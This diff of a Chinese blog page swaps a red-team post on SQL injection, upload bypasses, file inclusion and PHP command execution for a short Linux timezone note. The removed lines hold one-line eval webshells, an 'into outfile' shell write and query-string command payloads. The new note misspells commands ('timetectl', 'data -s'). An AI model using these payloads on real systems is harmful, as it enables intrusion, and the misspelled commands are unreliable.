@@ -19,28 +19,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="表单get,post注入 字符型注入     字符型注入类型     ![fajf](sql)     判断是字符型注入还是数值型注入         ?id&#x3D;1&#39; 如果是字符型,不会报错,如果是数字型则报错,下列是报错         and结果为假不出结果,数值字符型报错不出结果">
+    <meta name="description" content="对于ansible的使用,需要各个目标主机需要相同的时区和时间,需要用到liux的时间相关的指令    查看时间和时区timetectl statusdata -R修改 时间和时区 进去root权限下su  data -s1data -s &quot;2012-1-2 19:23:40&quot; 服务器时区设置 timedatectl set-timezone Asia&#x2F;Shangh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入">
-<meta property="og:url" content="http://example.com/2020/09/21/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="linux等一些工作上接触的指令">
+<meta property="og:url" content="http://example.com/2023/10/08/linux%E7%AD%89%E4%B8%80%E4%BA%9B%E5%B7%A5%E4%BD%9C%E4%B8%8A%E6%8E%A5%E8%A7%A6%E7%9A%84%E6%8C%87%E4%BB%A4/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="表单get,post注入 字符型注入     字符型注入类型     ![fajf](sql)     判断是字符型注入还是数值型注入         ?id&#x3D;1&#39; 如果是字符型,不会报错,如果是数字型则报错,下列是报错         and结果为假不出结果,数值字符型报错不出结果">
+<meta property="og:description" content="对于ansible的使用,需要各个目标主机需要相同的时区和时间,需要用到liux的时间相关的指令    查看时间和时区timetectl statusdata -R修改 时间和时区 进去root权限下su  data -s1data -s &quot;2012-1-2 19:23:40&quot; 服务器时区设置 timedatectl set-timezone Asia&#x2F;Shangh">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-21T14:17:49.000Z">
-<meta property="article:modified_time" content="2023-09-21T15:25:27.269Z">
+<meta property="article:published_time" content="2023-10-08T03:26:21.000Z">
+<meta property="article:modified_time" content="2023-10-08T04:07:53.687Z">
 <meta property="article:author" content="HWW">
-<meta property="article:tag" content="红队">
+<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2020/09/21/sql%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="http://example.com/2023/10/08/linux%E7%AD%89%E4%B8%80%E4%BA%9B%E5%B7%A5%E4%BD%9C%E4%B8%8A%E6%8E%A5%E8%A7%A6%E7%9A%84%E6%8C%87%E4%BB%A4/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2020/09/21/sql%E6%B3%A8%E5%85%A5/","path":"2020/09/21/sql注入/","title":"sql注入"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/10/08/linux%E7%AD%89%E4%B8%80%E4%BA%9B%E5%B7%A5%E4%BD%9C%E4%B8%8A%E6%8E%A5%E8%A7%A6%E7%9A%84%E6%8C%87%E4%BB%A4/","path":"2023/10/08/linux等一些工作上接触的指令/","title":"linux等一些工作上接触的指令"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sql注入 | Hexo</title>
+<title>linux等一些工作上接触的指令 | Hexo</title>
   
 
 
@@ -113,7 +113,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A8%E5%8D%95get-post%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">表单get,post注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">文件注入</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%97%B6%E9%97%B4%E5%92%8C%E6%97%B6%E5%8C%BA"><span class="nav-number">1.</span> <span class="nav-text">查看时间和时区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#timetectl-status"><span class="nav-number">1.1.</span> <span class="nav-text">timetectl status</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data-R"><span class="nav-number">1.2.</span> <span class="nav-text">data -R</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-%E6%97%B6%E9%97%B4%E5%92%8C%E6%97%B6%E5%8C%BA"><span class="nav-number">2.</span> <span class="nav-text">修改 时间和时区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#data-s"><span class="nav-number">2.1.</span> <span class="nav-text">data -s</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E5%8C%BA%E8%AE%BE%E7%BD%AE"><span class="nav-number">2.2.</span> <span class="nav-text">服务器时区设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%97%B6%E5%8C%BA%E4%B8%8D%E9%87%8D%E5%90%AF"><span class="nav-number">2.3.</span> <span class="nav-text">修改时区不重启</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -160,7 +160,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/21/sql%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/08/linux%E7%AD%89%E4%B8%80%E4%BA%9B%E5%B7%A5%E4%BD%9C%E4%B8%8A%E6%8E%A5%E8%A7%A6%E7%9A%84%E6%8C%87%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230921162145.jpg">
@@ -173,12 +173,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="sql注入 | Hexo">
+      <meta itemprop="name" content="linux等一些工作上接触的指令 | Hexo">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sql注入
+          linux等一些工作上接触的指令
         </h1>
 
         <div class="post-meta-container">
@@ -188,15 +188,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-09-21 22:17:49" itemprop="dateCreated datePublished" datetime="2020-09-21T22:17:49+08:00">2020-09-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-21 23:25:27" itemprop="dateModified" datetime="2023-09-21T23:25:27+08:00">2023-09-21</time>
+      <time title="创建时间：2023-10-08 11:26:21 / 修改时间：12:07:53" itemprop="dateCreated datePublished" datetime="2023-10-08T11:26:21+08:00">2023-10-08</time>
     </span>
 
   
@@ -206,14 +200,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.8k</span>
+      <span>489</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -223,95 +217,22 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="表单get-post注入"><a href="#表单get-post注入" class="headerlink" title="表单get,post注入"></a>表单get,post注入</h1><pre><code> 字符型注入
-    字符型注入类型
-    ![fajf](sql)
-    判断是字符型注入还是数值型注入
-        ?id=1&#39; 如果是字符型,不会报错,如果是数字型则报错,下列是报错
-        and结果为假不出结果,数值字符型报错不出结果
-</code></pre>
-<span id="more"></span>
-<h1 id="文件注入"><a href="#文件注入" class="headerlink" title="文件注入"></a>文件注入</h1><pre><code>黑名单绕过
-    apache的httpd-config的配置文件
-    pht
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>对于ansible的使用,需要各个目标主机需要相同的时区和时间,需要用到liux的时间相关的指令</p>
+</blockquote>
+<!---more--->
 
-后缀名绕过
-    linux服务器对大小写敏感,windows反之
-        window特性
-            1.php.
-            2.php空格
-            3.php::$DATA
-
-
-    .htaccess文件攻击
-        SetHandler application/x-httpd-php该文件的代码会覆盖apache的httpd-config的配置文件,并且将内容按照php语法规则解析
-
-    php后缀限制,copy php jpeg 拼接
-
-服务端检测绕过
-    MIME类型检测
-        image/jepg
-
-    include包含注入
-    日志注入 phpstudy/apache/logs/error.log记录报错日志
-        浏览器url注入默认编码,会把php代码重新编码,执行不了,
-        抓包,可以防止浏览器重新编码,从而php代码被报错日志文件记录
-
-    文件包含注入(include) 
-        参数是file1.php文件,说明参数传入到include包含,执行了file1.php代码
-        伪协议注入
-            php伪协议
-            data伪协议,删text, text/plian
-            data;&lt;?php system(&quot;dir&quot;);?&gt;
-                linux的代码system运行代码tax 解析文件并显示代码,cat 只解析文件
-                system(ls )
-                system(ls ../)
-                system(cat ../key.php)
-
-
-
-
-数据库写码
-    https://blog.csdn.net/qq_33942040/article/details/108577874
-    两种方式
-    一种mysql日志写入
-    一种直接写入
-    ｜ select &#39;&lt;?php @eval($_POST[w]);?&gt;&#39; into outfile &#39;c:/wamp/www/45.php&#39;
-
-命令执行和代码(远程)执行
-    写小马写在网站目录里面,因为有php环境,可以执行php代码
-    命令执行漏洞是直接调用操作系统命令，故这里叫作OS命令执行漏洞，
-    代码执行漏洞则是靠执行脚本代码调用操作系统命令。
-    命令执行：(系统本地命令) windows常见命令
-        net user命令是Windows操作系统中的一个命令行工具
-        system()       输出并返回最后一行shell结果
-        exec()         执行一个外部程序
-        shell_exec()   通过shell环境执行命令，并且将完整的输出以字符串的方式返回
-        passthru()     执行外部程序并且显示原始输出
-        pcntl_exec()   在当前进程空间执行指定程序
-        popen()        打开进程文件指针
-        proc_open()    执行一个命令，并且打开用来输入/输出的文件指针
-        ?a=type 文件名 ; 查看文件内容
-        ?a=cd 查看当前目录路径
-        ?a=echo&quot;&lt;?php phpinfo.php;?&gt; &quot; &gt; E:\xamapp\.phpinfo(); 写shell
-        ?a=dir 
-
-    远程/代码执行：
-        eval()            把字符串作为PHP代码执行
-        assert()          检查一个断言是否为 FALSE，可用来执行代码
-        preg_replace()    执行一个正则表达式的搜索和替换
-        call_user_func()  把第一个参数作为回调函数调用
-        call_user_func_array() 调用回调函数，并把一个数组参数作为回调函数的参数
-        array_map()       为数组的每个元素应用回调函数
-
-    利用远程命令执行代码
-        ?a=ls 
-        ?a=@eval($_POST[333]) 一句话木马
-        ?a=print(_FILE_)获取当前路径(只能用assert接收并执行,用eval执行不了)
-        ?a=var_dump(file_get_contents(&#39;路径&#39;));读取文件
-        a=var_dump(file_put_contents($_POST[1],$_POST[2]));
-            1=shell.php&amp;2=&lt;?php phpinfo();?&gt; 写shell,通过psot传递参数,构造shell.php文件,(在当前路径下)
-</code></pre>
+<h1 id="查看时间和时区"><a href="#查看时间和时区" class="headerlink" title="查看时间和时区"></a>查看时间和时区</h1><h2 id="timetectl-status"><a href="#timetectl-status" class="headerlink" title="timetectl status"></a>timetectl status</h2><h2 id="data-R"><a href="#data-R" class="headerlink" title="data -R"></a>data -R</h2><h1 id="修改-时间和时区"><a href="#修改-时间和时区" class="headerlink" title="修改 时间和时区"></a>修改 时间和时区</h1><blockquote>
+<p>进去root权限下<br>su</p>
+</blockquote>
+<h2 id="data-s"><a href="#data-s" class="headerlink" title="data -s"></a>data -s</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data -s &quot;2012-1-2 19:23:40&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="服务器时区设置"><a href="#服务器时区设置" class="headerlink" title="服务器时区设置"></a>服务器时区设置</h2><blockquote>
+<p>timedatectl set-timezone Asia&#x2F;Shanghai     </p>
+</blockquote>
+<h2 id="修改时区不重启"><a href="#修改时区不重启" class="headerlink" title="修改时区不重启"></a>修改时区不重启</h2><p>在root下<br>1、复制相应的时区文件，替换系统时区文件：<br>Linux代码</p>
+<blockquote>
+<p>cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;$主时区&#x2F;$次时区 &#x2F;etc&#x2F;localtime<br>cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;$主时区&#x2F;$次时区 &#x2F;etc&#x2F;localtime<br>列:root@ubuntu:&#x2F;# cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai  &#x2F;etc&#x2F;localtime</p>
+</blockquote>
 
     </div>
 
@@ -333,20 +254,20 @@
 </script>
 <div style="text-align: center"><span id="jrsc" >正在加载今日诗词....</span></div>
           <div class="post-tags">
-              <a href="/tags/%E7%BA%A2%E9%98%9F/" rel="tag"># 红队</a>
+              <a href="/tags/linux/" rel="tag"># linux</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/09/20/hexo%E5%8D%9A%E5%AE%A2/" rel="prev" title="hexo博客">
-                  <i class="fa fa-angle-left"></i> hexo博客
+                <a href="/2023/10/07/%E9%9A%8F%E8%AE%B0/" rel="prev" title="随记">
+                  <i class="fa fa-angle-left"></i> 随记
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/" rel="next" title="kali和centeos网络问题">
-                  kali和centeos网络问题 <i class="fa fa-angle-right"></i>
+                <a href="/2023/10/10/vps%E6%90%AD%E5%BB%BA%E8%8A%82%E7%82%B9/" rel="next" title="vps搭建节点">
+                  vps搭建节点 <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
